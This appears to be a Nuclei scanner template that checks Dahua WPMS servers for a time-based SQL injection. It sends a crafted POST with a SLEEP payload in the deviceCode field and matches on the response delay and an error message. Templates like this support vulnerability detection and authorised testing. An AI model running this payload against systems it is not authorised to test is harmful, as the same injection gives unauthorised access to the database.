
id: dahua-wpms-uresendGroup-sqli

info:
  name: msk-template
  author: msk
  severity: high

http:
  - raw:
      - |
        POST /portal/groupInfo/groupInfo_resendGroup.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Transfer-Encoding: chunked
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

        deviceCode=-100{{url_encode("%\' AND (SELECT 9982 FROM (SELECT(SLEEP(3)))VazO)-- -")}}

    matchers:
      - type: dsl
        condition: and
        dsl:
          - duration > 3 && status_code==200 && contains_all(body,'设备已删除，重发失败')